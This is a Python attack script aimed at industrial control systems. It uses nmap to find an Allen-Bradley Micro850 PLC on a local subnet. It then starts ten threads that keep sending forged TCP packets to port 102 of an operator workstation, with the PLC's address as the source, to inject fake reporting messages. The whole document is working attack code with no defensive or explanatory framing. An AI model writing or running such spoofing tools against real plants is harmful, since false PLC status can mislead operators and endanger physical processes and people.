import subprocess
from scapy.all import *
import time
import threading
import random

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def spoof_reporting_message(plc_ip, workstation_ip):
    try:
        # Create a packet with a spoofed source IP (PLC) and destination IP (workstation)
        packet = IP(src=plc_ip, dst=workstation_ip)/TCP(dport=102, flags='PA', seq=12345, ack=67890)/Raw(load=b' Spoofed reporting message')
        
        # Send the packet in a loop
        while True:
            send(packet, verbose=0)
            time.sleep(1)  # Send a packet every second
    except Exception as e:
        print(f"Failed to spoof reporting message: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Ask for the workstation IP
        workstation_ip = input("Enter the workstation IP: ")
        
        # Ask for confirmation before starting the spoofing
        confirmation = input("Are you sure you want to spoof reporting messages? (yes/no): ")
        if confirmation.lower() == 'yes':
            # Create multiple threads to send packets
            for _ in range(10):
                spoof_thread = threading.Thread(target=spoof_reporting_message, args=(plc_ip, workstation_ip))
                spoof_thread.daemon = True  # So that the thread dies when main thread dies
                spoof_thread.start()
            
            while True:
                user_input = input("Type 'top' to stop spoofing: ")
                if user_input.lower() == 'top':
                    break
        else:
            print("Spoofing cancelled.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()